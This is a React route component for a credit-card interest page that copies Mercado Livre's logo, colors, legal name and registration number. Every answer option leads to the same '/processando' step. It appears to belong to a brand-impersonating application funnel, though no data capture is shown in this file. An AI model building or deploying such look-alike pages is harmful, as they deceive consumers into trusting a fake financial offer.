import { createFileRoute, useNavigate } from "@tanstack/react-router";
import mlLogo from "@/assets/mercado-livre-logo.png";

export const Route = createFileRoute("/interesse")({
  head: () => ({
    meta: [
      { title: "Seu interesse - Mercado Livre" },
      { name: "description", content: "Conte qual o seu interesse com o cartão de crédito." },
    ],
  }),
  component: Interesse,
});

function Interesse() {
  const navigate = useNavigate();

  const options = [
    "Fazer uma compra específica",
    "Fazer uma viagem",
    "Poder gastar mais",
    "Organizar o meu financeiro",
    "Outros",
  ];

  const handleSelect = () => {
    navigate({ to: "/processando" });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      {/* Header */}
      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>

      {/* Decorative circles */}
      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl md:text-3xl font-bold text-gray-800 mb-6">
            Qual é o seu interesse com um Cartão de Crédito hoje?
          </h1>

          <div className="space-y-3">
            {options.map((opt) => (
              <button
                key={opt}
                onClick={handleSelect}
                className="w-full bg-[#EAF2FE] hover:bg-[#D6E6FD] text-gray-900 font-semibold py-4 px-4 rounded-lg transition-all text-base"
              >
                {opt}
              </button>
            ))}
          </div>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
          <a href="#" className="text-gray-900">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
